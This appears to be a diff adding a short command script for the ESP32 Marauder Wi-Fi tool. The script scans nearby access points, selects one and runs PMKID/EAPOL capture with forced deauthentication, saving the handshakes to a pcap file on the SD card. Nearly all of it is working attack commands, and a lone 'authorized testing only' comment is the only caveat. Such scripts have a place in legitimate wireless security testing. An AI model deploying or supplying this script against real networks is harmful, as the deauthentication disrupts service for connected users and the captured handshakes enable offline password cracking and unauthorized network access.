@@ -1,0 +1,18 @@
+# pmkid_capture_selected -- capture PMKID/EAPOL from a chosen AP, nudged with deauth
+# Target: Marauder v6 / v6.1 (ESP32-WROOM + microSD), esp32_marauder_v6_1.bin, v1.13.0
+# Flow: scan APs -> select AP index 0 -> sniffpmkid on selected AP with deauth (-l -d)
+#   -l = restrict to the selected AP(s);  -d = deauth to force a handshake
+# EDIT: change `select -a 0` to the AP index shown by `list -a`.
+# Duration: ~90 s.  SD: required to save the .pcap.  GPS: not required.
+# Authorized testing only.
+
+stopscan
+clearlist -a
+scanap
+DELAY 25000
+stopscan
+list -a
+select -a 0
+sniffpmkid -l -d
+DELAY 60000
+stopscan
